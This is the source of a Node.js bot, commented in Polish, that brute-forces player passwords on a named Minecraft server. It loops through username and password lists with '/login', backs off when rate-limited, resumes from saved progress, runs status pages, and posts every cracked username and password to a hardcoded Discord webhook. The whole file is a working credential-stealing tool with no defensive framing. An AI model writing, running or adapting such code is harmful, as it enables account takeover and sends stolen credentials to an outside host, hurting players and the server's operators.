import mineflayer from 'mineflayer';
import fs from 'fs';
import https from 'https';
import http from 'http';

const server = { host: 'anarchia.gg', port: 25565 };
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457118913962709012/DnLe-AkG_W9GOp7wR2kJoS36JvL3HHDdIBf-ogrZfN3B6yOxi7-IZYFPanx_qFgJVJZP';
const PROGRESS_FILE = 'progress.json';
const USERNAMES_FILE = 'usernames.txt'; // ← NOWY PLIK

// ============ FUNKCJE DO ZARZĄDZANIA NICKAMI ============
function loadUsernames() {
    if (fs.existsSync(USERNAMES_FILE)) {
        return fs.readFileSync(USERNAMES_FILE, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line);
    }
    return [];
}

function removeUsername(username) {
    try {
        let usernames = loadUsernames();
        const before = usernames.length;
        usernames = usernames.filter(u => u !== username);
        const after = usernames.length;
        
        if (before !== after) {
            fs.writeFileSync(USERNAMES_FILE, usernames.join('\n'));
            console.log(`🗑️ [${username}] Usunięto z listy (${before} → ${after} kont)`);
        }
    } catch (e) {
        console.error(`⚠️ Nie można usunąć ${username} z listy:`, e.message);
    }
}

// ============ KEEP-ALIVE SERVER ============
const KEEP_ALIVE_PORT = 3000;
let statsData = {
    uptime: 0,
    accounts: {},
    lastUpdate: new Date().toISOString()
};

const keepAliveServer = http.createServer((req, res) => {
    statsData.uptime = Math.floor(process.uptime());
    statsData.lastUpdate = new Date().toISOString();
    
    res.writeHead(200, { 
        'Content-Type': 'text/html; charset=utf-8',
        'Access-Control-Allow-Origin': '*'
    });
    
    const progress = loadProgress();
    const remainingUsers = loadUsernames();
    const accountsList = Object.entries(progress)
        .map(([nick, data]) => `<li><strong>${nick}</strong>: ${data.lastIndex}/${data.totalPasswords}</li>`)
        .join('');
    
    res.end(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <meta http-equiv="refresh" content="30">
            <title>Bot Status</title>
        </head>
        <body style="font-family: monospace; padding: 20px; background: #0d1117; color: #58a6ff;">
            <h1>🤖 Minecraft Bruteforce Bot</h1>
            <p>✅ Status: <span style="color: #3fb950;">RUNNING</span></p>
            <p>⏱️ Uptime: ${statsData.uptime}s</p>
            <p>📊 Active accounts: ${Object.keys(progress).length}</p>
            <p>📋 Remaining: ${remainingUsers.length} kont</p>
            <p>🕐 Last update: ${statsData.lastUpdate}</p>
            <hr>
            <h3>📋 Progress:</h3>
            <ul>${accountsList || '<li>No accounts yet</li>'}</ul>
            <hr>
            <h3>🔜 Remaining accounts:</h3>
            <p style="font-size: 12px;">${remainingUsers.join(', ') || 'Brak'}</p>
            <small style="color: #8b949e;">Auto-refresh every 30s</small>
        </body>
        </html>
    `);
});

keepAliveServer.listen(KEEP_ALIVE_PORT, () => {
    console.log(`🌐 Keep-alive server on port ${KEEP_ALIVE_PORT}`);
});

const HTTP_PORT = process.env.PORT || 8080;
const httpServer = http.createServer((req, res) => {
    const progress = loadProgress();
    const remainingUsers = loadUsernames();
    const accounts = Object.keys(progress).length;
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(`
        <!DOCTYPE html>
        <html>
        <head><title>Minecraft Bot Status</title></head>
        <body style="font-family: monospace; padding: 20px; background: #1a1a1a; color: #00ff00;">
            <h1>🤖 Minecraft Bruteforce Bot</h1>
            <p>✅ Status: <strong>RUNNING</strong></p>
            <p>📊 Active accounts: <strong>${accounts}</strong></p>
            <p>📋 Remaining: <strong>${remainingUsers.length}</strong></p>
            <p>🕐 Uptime: ${process.uptime().toFixed(0)}s</p>
            <hr>
            <h3>Progress:</h3>
            <pre>${JSON.stringify(progress, null, 2)}</pre>
        </body>
        </html>
    `);
});

httpServer.listen(HTTP_PORT, () => {
    console.log(`🌐 HTTP server running on port ${HTTP_PORT}`);
});

let backupInterval = null;

function backupProgress() {
    try {
        if (fs.existsSync(PROGRESS_FILE)) {
            const timestamp = new Date().toISOString().replace(/:/g, '-').split('.')[0];
            const backupFile = `progress_backup_${timestamp}.json`;
            fs.copyFileSync(PROGRESS_FILE, backupFile);
            console.log(`💾 Backup utworzony: ${backupFile}`);
        }
    } catch (e) {
        console.error('⚠️ Błąd podczas backup:', e.message);
    }
}

function sendToDiscord(username, password) {
    console.log(`🔔 Wysyłam: ${username}:${password}`);
    
    if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('YOUR_DISCORD_WEBHOOK')) {
        console.error('❌ USTAW WEBHOOK!');
        return;
    }

    const payload = JSON.stringify({
        embeds: [{
            title: "🎯 Znaleziono działające konto!",
            color: 0x00ff00,
            fields: [
                {
                    name: "👤 Nickname",
                    value: `\`${username}\``,
                    inline: true
                },
                {
                    name: "🔑 Hasło",
                    value: `\`${password}\``,
                    inline: true
                },
                {
                    name: "🌐 Serwer",
                    value: `\`${server.host}\``,
                    inline: false
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "Minecraft Bruteforce Tool"
            }
        }]
    });

    const webhookUrl = new URL(DISCORD_WEBHOOK);
    const options = {
        hostname: webhookUrl.hostname,
        path: webhookUrl.pathname + webhookUrl.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    const req = https.request(options, (res) => {
        if (res.statusCode === 204 || res.statusCode === 200) {
            console.log(`📤 ✅ Wysłano na Discord!`);
        } else {
            console.log(`📤 ⚠️ Discord status: ${res.statusCode}`);
        }
        
        res.on('data', (d) => {
            if (res.statusCode !== 204 && res.statusCode !== 200) {
                console.log('Response:', d.toString());
            }
        });
    });

    req.on('error', (e) => {
        console.error('❌ Webhook error:', e.message);
    });

    req.write(payload);
    req.end();
}

function loadProgress() {
    if (fs.existsSync(PROGRESS_FILE)) {
        try {
            return JSON.parse(fs.readFileSync(PROGRESS_FILE, 'utf8'));
        } catch (e) {
            return {};
        }
    }
    return {};
}

function saveProgress(username, passwordIndex, totalPasswords) {
    try {
        let progress = {};
        
        if (fs.existsSync(PROGRESS_FILE)) {
            try {
                const data = fs.readFileSync(PROGRESS_FILE, 'utf8');
                progress = JSON.parse(data);
            } catch (e) {
                console.error(`⚠️ Błąd odczytu progress.json, tworzę nowy`);
                progress = {};
            }
        }
        
        progress[username] = {
            lastIndex: passwordIndex,
            totalPasswords: totalPasswords,
            timestamp: new Date().toISOString()
        };
        
        const tempFile = PROGRESS_FILE + '.tmp';
        fs.writeFileSync(tempFile, JSON.stringify(progress, null, 2));
        fs.renameSync(tempFile, PROGRESS_FILE);
        
    } catch (e) {
        console.error(`⚠️ [${username}] Nie można zapisać progress:`, e.message);
    }
}

function getLastIndex(username) {
    const progress = loadProgress();
    return progress[username]?.lastIndex || 0;
}

function clearProgress(username) {
    try {
        const progress = loadProgress();
        
        if (progress[username]) {
            delete progress[username];
            fs.writeFileSync(PROGRESS_FILE, JSON.stringify(progress, null, 2));
            console.log(`🗑️ [${username}] Progress wyczyszczony`);
        }
    } catch (e) {
        console.error(`⚠️ [${username}] Nie można wyczyścić progress:`, e.message);
    }
}

function loadPasswords(filename) {
    return fs.readFileSync(filename, 'utf8')
        .split('\n')
        .map(line => line.trim())
        .filter(line => line);
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function isRateLimited(reason) {
    const reasonStr = reason.toString().toLowerCase();
    return reasonStr.includes('zbyt często') || 
           reasonStr.includes('spróbować ponownie') ||
           reasonStr.includes('rate limit');
}

async function bruteforceAccount(username, passwords) {
    let passwordIndex = getLastIndex(username);
    let consecutiveRateLimits = 0;
    let consecutiveErrors = 0;
    
    if (passwordIndex > 0) {
        console.log(`📍 [${username}] Wznowienie od hasła #${passwordIndex + 1}`);
    }

    while (passwordIndex < passwords.length) {
        const result = await tryPasswordsInSession(username, passwords, passwordIndex);

        if (result.status === 'success') {
            console.log(`\n✅ [${username}] ZNALEZIONO! Hasło: ${result.password}`);
            sendToDiscord(username, result.password);
            clearProgress(username);
            removeUsername(username); // ← USUŃ Z LISTY
            return 'success';
        } else if (result.status === 'premium') {
            console.log(`\n💎 [${username}] Konto premium - STOP`);
            removeUsername(username); // ← USUŃ Z LISTY
            return 'premium';
        } else if (result.status === 'already_online') {
            console.log(`\n🔄 [${username}] Gracz już online`);
            return 'already_online';
        } else if (result.status === 'not_registered') {
            console.log(`\n🛑 [${username}] Niezarejestrowane - STOP`);
            removeUsername(username); // ← USUŃ Z LISTY
            return 'not_registered';
        } else if (result.status === 'rate_limited') {
            consecutiveRateLimits++;
            consecutiveErrors = 0;
            passwordIndex = result.nextIndex;
            saveProgress(username, passwordIndex, passwords.length);
            
            const delay = Math.min(consecutiveRateLimits * 1000, 5000);
            console.log(`⏳ [${username}] Rate limit - czekam ${delay/1000}s`);
            await sleep(delay);
        } else if (result.status === 'error' || result.status === 'connection_error') {
            consecutiveErrors++;
            consecutiveRateLimits = 0;
            passwordIndex = result.nextIndex;
            saveProgress(username, passwordIndex, passwords.length);
            
            const delay = Math.min(consecutiveErrors * 500, 3000);
            console.log(`⚠️ [${username}] Błąd połączenia - czekam ${delay/1000}s`);
            await sleep(delay);
        } else {
            consecutiveRateLimits = 0;
            consecutiveErrors = 0;
            passwordIndex = result.nextIndex;
            saveProgress(username, passwordIndex, passwords.length);
            await sleep(200);
        }
    }

    console.log(`\n❌ [${username}] Nie znaleziono hasła (${passwords.length} prób)`);
    removeUsername(username); // ← USUŃ Z LISTY (ukończone)
    return 'completed';
}

async function bruteforceWithRetry(username, passwords) {
    while (true) {
        const result = await bruteforceAccount(username, passwords);
        
        if (result === 'already_online') {
            console.log(`🔄 [${username}] Gracz online - retry za 30s...`);
            await sleep(30000);
            console.log(`🔄 [${username}] Próbuję ponownie...`);
            continue;
        }
        
        break;
    }
}

async function tryPasswordsInSession(username, passwords, startIndex) {
    return new Promise((resolve) => {
        let bot = null;
        let currentPasswordIndex = startIndex;
        let testedInThisSession = 0;
        let waitingForLoginResponse = false;
        let resolved = false;
        let isLoggedIn = false;
        let canTryLogin = false;
        let sessionTimeout = null;
        let passwordTimeout = null;

        const cleanup = () => {
            if (sessionTimeout) clearTimeout(sessionTimeout);
            if (passwordTimeout) clearTimeout(passwordTimeout);
            
            if (bot) {
                try {
                    bot.removeAllListeners();
                    bot._client?.removeAllListeners();
                    bot.end();
                } catch (e) {}
                bot = null;
            }
        };

        const safeResolve = (result) => {
            if (!resolved) {
                resolved = true;
                cleanup();
                resolve(result);
            }
        };

        const tryNextPassword = () => {
            if (currentPasswordIndex >= passwords.length || !canTryLogin || waitingForLoginResponse || resolved) {
                return;
            }

            const password = passwords[currentPasswordIndex];
            console.log(`🔍 [${username}] [${currentPasswordIndex + 1}/${passwords.length}] ${password}`);
            
            waitingForLoginResponse = true;
            
            try {
                if (bot && bot.chat) {
                    bot.chat(`/login ${password}`);
                } else {
                    waitingForLoginResponse = false;
                    safeResolve({ 
                        status: 'error', 
                        nextIndex: currentPasswordIndex 
                    });
                    return;
                }
            } catch (e) {
                waitingForLoginResponse = false;
                currentPasswordIndex++;
                setTimeout(() => tryNextPassword(), 100);
                return;
            }
            
            testedInThisSession++;

            if (passwordTimeout) clearTimeout(passwordTimeout);
            passwordTimeout = setTimeout(() => {
                if (waitingForLoginResponse && !resolved) {
                    waitingForLoginResponse = false;
                    currentPasswordIndex++;
                    tryNextPassword();
                }
            }, 2000);
        };

        try {
            bot = mineflayer.createBot({
                host: server.host,
                port: server.port,
                username,
                version: '1.20.1',
            });
        } catch (err) {
            safeResolve({ 
                status: 'connection_error', 
                nextIndex: startIndex 
            });
            return;
        }

        bot.on('error', (err) => {
            if (resolved) return;
            
            const errMsg = (err.message || '').toLowerCase();
            if (errMsg.includes('invalid session') || errMsg.includes('zalogowany')) {
                safeResolve({ status: 'premium' });
            } else if (errMsg.includes('econnreset') || errMsg.includes('econnrefused')) {
                safeResolve({ 
                    status: 'connection_error', 
                    nextIndex: currentPasswordIndex 
                });
            } else {
                safeResolve({ 
                    status: 'error', 
                    nextIndex: currentPasswordIndex 
                });
            }
        });

        bot.once('spawn', () => {
            if (resolved) return;
            console.log(`🔥 [${username}] Połączono [${currentPasswordIndex + 1}/${passwords.length}]`);
            canTryLogin = true;
        });

        bot.on('kicked', (reason) => {
            if (resolved) return;
            
            const reasonStr = reason.toString().toLowerCase();
            
            if (reasonStr.includes('invalid session') || reasonStr.includes('zalogowany do swojego konta')) {
                safeResolve({ status: 'premium' });
            } else if (reasonStr.includes('aktywny na serwerze') || reasonStr.includes('already online')) {
                safeResolve({ status: 'already_online' });
            } else if (isRateLimited(reason)) {
                safeResolve({ 
                    status: 'rate_limited', 
                    nextIndex: currentPasswordIndex 
                });
            } else {
                safeResolve({ 
                    status: 'kicked', 
                    nextIndex: currentPasswordIndex 
                });
            }
        });

        bot.on('end', () => {
            if (!resolved) {
                safeResolve({ 
                    status: 'disconnected', 
                    nextIndex: currentPasswordIndex 
                });
            }
        });

        bot.on('message', (message) => {
            if (resolved) return;
            
            const msg = message.toString().toLowerCase();

            if (msg.includes('/register')) {
                safeResolve({ status: 'not_registered' });
            } 
            else if (msg.includes('/login')) {
                if (!isLoggedIn && !resolved) {
                    canTryLogin = true;
                    setTimeout(() => tryNextPassword(), 50);
                }
            } 
            else if (msg.includes('błędne') || msg.includes('incorrect') || msg.includes('wrong') || msg.includes('nieprawidłowe')) {
                waitingForLoginResponse = false;
                currentPasswordIndex++;
                if (passwordTimeout) clearTimeout(passwordTimeout);
                setTimeout(() => tryNextPassword(), 200);
            } 
            else if (msg.includes('pomyślnie') || msg.includes('successfully') || msg.includes('zalogowano')) {
                isLoggedIn = true;
                safeResolve({ 
                    status: 'success', 
                    password: passwords[currentPasswordIndex] 
                });
            }
        });

        sessionTimeout = setTimeout(() => {
            if (!resolved) {
                safeResolve({ 
                    status: 'timeout', 
                    nextIndex: currentPasswordIndex 
                });
            }
        }, 3000);
    });
}

async function main() {
    console.log('━'.repeat(60));
    console.log('🚀 MINECRAFT BRUTEFORCE - AUTO MODE');
    console.log('━'.repeat(60));

    // ŁADUJ NICKI Z PLIKU
    const usernames = loadUsernames();
    
    if (usernames.length === 0) {
        console.log('❌ Brak nicków w usernames.txt!');
        return;
    }
    
    console.log(`👥 Załadowano ${usernames.length} kont`);

    const passwordFile = 'passwords.txt';
    if (!fs.existsSync(passwordFile)) {
        console.log(`❌ Brak pliku ${passwordFile}!`);
        return;
    }

    const passwords = loadPasswords(passwordFile);
    if (passwords.length === 0) {
        console.log('❌ Lista haseł pusta!');
        return;
    }

    console.log(`📋 ${passwords.length} haseł | 🎯 ${usernames.length} kont | 🌐 ${server.host}`);
    
    for (const username of usernames) {
        const lastIndex = getLastIndex(username);
        if (lastIndex > 0) {
            console.log(`⚡ ${username}: kontynuacja od #${lastIndex + 1}`);
        } else {
            console.log(`🆕 ${username}: nowy start`);
        }
    }
    
    console.log('━'.repeat(60));

    backupInterval = setInterval(() => {
        backupProgress();
    }, 5 * 60 * 1000);

    const tasks = usernames.map(username => bruteforceWithRetry(username, passwords));
    await Promise.all(tasks);

    console.log('━'.repeat(60));
    console.log('🏁 Zakończono wszystkie konta');
}

process.on('uncaughtException', (err) => {
    console.error('⚠️ Nieoczekiwany błąd:', err.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('⚠️ Odrzucona obietnica:', reason);
});

main().catch(err => {
    console.error('❌ Błąd krytyczny:', err.message);
    process.exit(1);
});
